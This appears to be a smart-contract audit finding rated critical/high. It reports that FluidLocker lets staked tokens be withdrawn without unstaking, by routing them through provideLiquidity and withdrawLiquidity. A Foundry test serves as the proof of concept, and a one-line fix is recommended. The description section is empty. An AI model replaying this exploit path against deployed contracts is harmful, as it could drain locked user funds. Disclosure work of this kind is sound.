---
id: 25649
severity: "Crit/High"
---

# Staked tokens inside FluidLocker can be withdrawn without calling Unstake

## Description



## Proof of Concept

Place the following test inside `FluidLockerTest` contract, which is located in `FluidLocker.t.sol`

```solidity
    function testWithdrawWithoutUnstake()
    external
    virtual
    {
        uint fundingAmount = 100e18;
        // Set up Alice's Locker to be functional
        // i. e. not revert due to "lack of funds", "no LP pool units", "no staker pool units", etc.
        _helperFundLocker(address(aliceLocker), fundingAmount);
        _helperLockerStake(address(bobLocker));
        _helperLockerProvideLiquidity(address(carolLocker));

        vm.startPrank(ALICE);
        aliceLocker.stake(fundingAmount); //Stake all avaialble tokens
        aliceLocker.provideLiquidity{ value: fundingAmount / (2 * 9900) }(100e18); //Provide liquidity using the staked tokens
        vm.stopPrank();
        //warp forward to tax free withdrawn time
        vm.warp(block.timestamp + FluidLocker(payable(address(aliceLocker))).TAX_FREE_WITHDRAW_DELAY());

        //alice withdraw liquidity and closes position
        uint256 positionTokenId = _nonfungiblePositionManager.tokenOfOwnerByIndex(
            address(aliceLocker), FluidLocker(payable(address(aliceLocker))).activePositionCount() - 1
        );
        (,,,,,,, uint128 positionLiquidity,,,,) = _nonfungiblePositionManager.positions(positionTokenId);
        (uint256 amount0ToRemove, uint256 amount1ToRemove) = _helperGetAmountsForLiquidity(_pool, positionLiquidity);
        vm.prank(ALICE);
        aliceLocker.withdrawLiquidity(positionTokenId, positionLiquidity, amount0ToRemove, amount1ToRemove);

        // Check that most of contract's fluid tokens are moved to Alice's address
        // Despite us never calling unstake()
        assertApproxEqAbs(fundingAmount,
            _fluidSuperToken.balanceOf(address(ALICE)),
            fundingAmount * 5 / 100 // 5% tolerance
        );
        assertApproxEqAbs(0,
            _fluidSuperToken.balanceOf(address(aliceLocker)),
            fundingAmount * 5 / 100 // 5% tolerance
        );
        // Check that aliceLocker still believes that 100e18 tokens are staked inside it
        assertEq(aliceLocker.getStakedBalance(), fundingAmount);
        // Check that getAvailableBalance reverts because locker balance is less than staked amount
        vm.expectRevert();
        aliceLocker.getAvailableBalance();
    }
```

## Recommendation

Validate that the amount of tokens used to provide liquidity should never exceed getAvailableBalance()
